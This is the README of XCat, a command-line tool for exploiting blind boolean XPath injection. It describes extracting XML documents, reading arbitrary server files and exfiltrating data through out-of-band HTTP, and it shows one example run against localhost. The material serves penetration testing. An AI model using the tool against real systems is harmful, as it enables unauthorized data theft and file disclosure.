About XCat
==========

XCat is a command line program that aides in the exploitation of blind XPath injection vulnerabilities. It can be used
to retrieve the whole XML document being processed by a vulnerable XPath query, read arbitrary files on the hosts filesystem
and utilize out of bound HTTP requests to make the server send data directly to xcat.

XCat is built to exploit boolean XPath injections (Where only one bit of data can be extracted in one request)
and it requires you to manually identify the exploit first, this does not do that for you. Check out the docs 
at http://xcat.readthedocs.org/ for more info.

**Note:** This requires Python 3.4 to run.


An example::

    >> xcat --public-ip="localhost" http://localhost:80 title=Bible title "Book found" run retrieve
    Injecting using SingleQuoteString
    Detecting features...
    Supported features: XPath 2, String to codepoints, External DOC function, Entity injection, Substring search speedup
    Retrieving /*[1]
    <?xml version="1.0" encoding="utf-8"?>
    <lib test="1" attribute1="3">
        <book>
                <!-- Comment -->
                <title>Bible</title>
                <description another="attribute">The holy book</description>
    ...
